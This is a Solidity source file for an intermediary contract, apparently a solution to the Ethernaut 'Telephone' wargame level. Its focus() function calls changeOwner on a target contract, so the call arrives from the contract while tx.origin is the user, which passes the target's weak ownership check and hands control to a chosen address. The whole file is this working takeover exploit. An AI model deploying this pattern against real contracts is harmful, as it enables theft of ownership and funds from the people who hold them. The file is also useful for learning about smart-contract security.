// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneMid {
    address public new_owner;
    address public target_contract_adress;

    constructor(address _owner, address _target_contract_adress) {
        new_owner = _owner;
        target_contract_adress = _target_contract_adress;
    }

    function focus() public {
        ITelephone telephone = ITelephone(target_contract_adress);
        telephone.changeOwner(new_owner);
    }
}